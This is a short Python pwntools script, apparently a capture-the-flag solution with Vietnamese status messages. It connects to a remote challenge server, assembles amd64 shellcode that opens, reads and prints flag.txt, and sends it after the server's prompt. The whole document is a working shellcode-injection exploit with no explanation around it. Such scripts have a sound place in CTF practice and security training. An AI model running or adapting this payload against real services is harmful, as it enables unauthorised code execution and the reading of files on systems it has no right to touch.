from pwn import *

context.arch = 'amd64'
host = '0.cloud.chals.io'
port = 34381
io = remote(host, port)

shellcode = shellcraft.open('flag.txt') 

shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)
payload = asm(shellcode)

print(f"[*] Payload đã tạo, độ dài: {len(payload)} bytes")
io.recvuntil(b'> ')
io.send(payload)

print("[*] Phản hồi từ server:")
print(io.recvall().decode(errors='ignore'))